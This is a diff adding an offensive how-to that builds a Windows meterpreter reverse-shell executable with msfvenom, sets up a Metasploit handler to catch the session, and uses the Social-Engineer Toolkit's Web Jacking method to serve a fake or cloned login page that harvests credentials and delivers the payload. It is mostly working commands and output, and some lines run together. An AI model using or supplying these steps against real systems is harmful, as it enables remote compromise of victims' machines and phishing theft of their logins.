@@ -1,0 +1,58 @@
+Step 1: Generate the executable payload
+On the attacker’s box, run msfvenom:
+
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.123 LPORT=4444 -f exe -o /tmp/iambad.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of exe file: 73802 bytes
+Saved as: /tmp/iambad.exe
+Step 2: Copy the executable payload to box B
+Box B is the victim machine.
+
+Step 3: Set up the payload handler on box A
+Box A is the attacker machine.
+
+$ ./msfconsole -q
+msf > use exploit/multi/handler
+msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf exploit(handler) > set lhost 192.168.1.123
+lhost => 192.168.1.123
+msf exploit(handler) > set lport 4444
+lport => 4444
+msf exploit(handler) > run
+
+[*] Started reverse handler on 192.168.1.123:4444
+[*] Starting the payload handler...
+Step 4: Double-click on the malicious executable
+This step requires no further explanation.
+
+Step 5: View the meterpreter/payload session on box A
+
+------------------------------------------------------------------------------------------------------------
+
+SET toolkit :-
+
+Step 1: Navigate to the Web Jacking MenuLaunch the toolkit: sudo setoolkit
+Select 1) Social-Engineering Attacks.
+Select 2) Website Attack Vectors.
+Select 5) Web Jacking Attack Method.
+Step 2: Choose the Site Configuration 
+You will be prompted with three choices to build the page:
+1) Web Templates (Uses pre-built simple pages included in SET)
+
+2) Site Cloner (Attempts to scrape a live URL).3) Custom Import (Uses your manually saved index.html).
+Recommendation for a smooth setup: Select 1) Web Templates to avoid internet connection or scraping errors.
+Step 3: Configure Networking and Post-BackIP address for POST back / SET web server: Enter your local IP address: 192.168.0.103
+If you selected Web Templates, choose a template from the list (e.g., Google or a standard login portal) by entering its corresponding number.
+If you selected Site Cloner, enter a simple, non-protected HTTP or HTTPS URL (e.g., http://example.com) that allows automated scraping.
+
+Step 4: Link your Msfvenom PayloadSET will ask if you want to use a built-in payload or a custom one. Select the option for Custom Executable.Provide the full path to your generated payload file: /tmp/iambad.exeSET will compile the attack structure and start its internal web server on port 80.
+  
+Step 5: Start your Metasploit Listener ManuallyBecause you generated the binary independently with msfvenom, you must run your handler to catch the session when the executable is downloaded and run:Open a new terminal tab or window.Launch the framework: msfconsoleEnter the following listener configurations:bashuse exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.0.103
+set LPORT 4444
+exploit
